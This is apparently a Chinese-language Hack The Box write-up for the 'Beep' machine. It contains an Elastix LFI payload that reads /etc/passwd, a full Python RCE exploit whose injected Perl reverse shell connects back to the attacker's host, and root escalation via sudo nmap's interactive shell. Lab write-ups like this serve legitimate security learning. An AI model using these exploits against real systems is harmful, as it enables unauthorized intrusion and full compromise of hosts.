# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测

```
┌──(root💀kali)-[~/htb/Beep]
└─# nmap -sV -Pn 10.10.10.7 -p-                                                                                                                                                                                                       130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-09 01:07 EST
Nmap scan report for 10.10.10.7
Host is up (0.33s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/https?
879/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1565.01 seconds


```

开了好多端口，现实当中端口越多漏洞越多，但是具体到这些靶机，很可能意味着很多兔子洞，所以枚举的时候一定要小心分辨

先用gobuster爆破80端口目录看看，需要主要要加```-k```跳过ssl验证

## 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# gobuster dir -w /usr/share/wordlists/Web-Content/common.txt -k -u https://10.10.10.7/ --wildcard 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/09 02:53:35 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 282]
/.htaccess            (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 287]
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/cgi-bin/             (Status: 403) [Size: 286]                                
Progress: 1041 / 4686 (22.22%)                                                [ERROR] 2021/12/09 02:56:30 [!] Get "https://10.10.10.7/certs": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
/favicon.ico          (Status: 200) [Size: 894]                                  
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]   
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/] 
/index.php            (Status: 200) [Size: 1785]                                 
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]   
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]   
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]   
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]  
/robots.txt           (Status: 200) [Size: 28]                                   
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/] 
Progress: 3959 / 4686 (84.49%)                                                  [ERROR] 2021/12/09 03:02:55 [!] Get "https://10.10.10.7/status": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3986 / 4686 (85.06%)                                                  [ERROR] 2021/12/09 03:03:04 [!] Get "https://10.10.10.7/style_captcha": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4036 / 4686 (86.13%)                                                  [ERROR] 2021/12/09 03:03:19 [!] Get "https://10.10.10.7/swfobject.js": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/] 
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]    

```

80端口的服务跑着一个叫```elastix```的cms，谷歌了一下这个cms存在一个LFI漏洞,参考[这个exp](https://www.exploit-db.com/exploits/37637)

验证POC如下
```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```

页面打印
```
root:x:0:0:root:/root:/bin/bash 
bin:x:1:1:bin:/bin:/sbin/nologin 
daemon:x:2:2:daemon:/sbin:/sbin/nologin 
adm:x:3:4:adm:/var/adm:/sbin/nologin 
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 
sync:x:5:0:sync:/sbin:/bin/sync 
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 
halt:x:7:0:halt:/sbin:/sbin/halt 
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 
news:x:9:13:news:/etc/news: 
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin 
operator:x:11:0:operator:/root:/sbin/nologin 
games:x:12:100:games:/usr/games:/sbin/nologin 
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin 
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 
nobody:x:99:99:Nobody:/:/sbin/nologin 
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash 
distcache:x:94:94:Distcache:/:/sbin/nologin 
vcsa:x:69:69:virtual console memory 
owner:/dev:/sbin/nologin 
pcap:x:77:77::/var/arpwatch:/sbin/nologin 
ntp:x:38:38::/etc/ntp:/sbin/nologin 
cyrus:x:76:12:Cyrus 
IMAP Server:/var/lib/imap:/bin/bash 
dbus:x:81:81:System message bus:/:/sbin/nologin 
apache:x:48:48:Apache:/var/www:/sbin/nologin 
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin 
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin 
postfix:x:89:89::/var/spool/postfix:/sbin/nologin 
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash 
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin 
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin 
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 
spamfilter:x:500:500::/home/spamfilter:/bin/bash 
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin 
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin 
fanis:x:501:501::/home/fanis:/bin/bash 
Sorry! Attempt to access restricted file.
```

ok,验证漏洞存在。由上面打印可知存在用户：asterisk，spamfilter，fanis

用下面payload可以读到user.txt
```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/user.txt%00&module=Accounts&action
```

LFI一般要结合上传漏洞或者文件解析漏洞才能拿到webshell
但是我找了一大圈一是没有找到上传入口，二是我找不到apache的access_log文件


# 初始shell
然后继续搜索这个cms的利用漏洞，发现还存在一个rce，在github上找到[这个利用脚本](https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution/blob/master/exploit.py)

不过这个脚本我本地执行时要加上这两行：
```
ctx.set_ciphers('HIGH:!DH:!aNULL')
ctx.set_ciphers('DEFAULT@SECLEVEL=1')
```
不然可能会报ssl错误

完整exp如下：

```
#exploit modified by infosecjunky
#https://infosecjunky.com

import urllib2
import ssl

rhost="10.10.10.7"
lhost="10.10.14.16"
lport=4444
extension="233"


ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_ciphers('HIGH:!DH:!aNULL')
ctx.set_ciphers('DEFAULT@SECLEVEL=1')

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib2.urlopen(url,context=ctx)
```

拿到webshell
```
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.7] 49229
id
uid=100(asterisk) gid=101(asterisk)
whoami
asterisk

```


# 提权

python切换tty
> python -c 'import pty; pty.spawn("/bin/sh")'

查看sudo 特权
```
sh-3.2$ sudo -l
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper

```

开了好多权限，选择nmap提权到root

```
sh-3.2$ sudo /usr/bin/nmap --interactive
sudo /usr/bin/nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
sh-3.2# whoami
whoami
root
sh-3.2# 

```
# 总结
很简单的靶机，初始shell那里花了些功夫，找了好久access.log
root以后发现在这个位置：
```
sh-3.2# find / -name access_log
find / -name access_log
/var/log/httpd/access_log
```

然后web账号是没有读权限的
```
sh-3.2$ id
id
uid=100(asterisk) gid=101(asterisk)
sh-3.2$ cat /var/log/httpd/access_log
cat /var/log/httpd/access_log
cat: /var/log/httpd/access_log: Permission denied
```

要注意这些兔子洞。
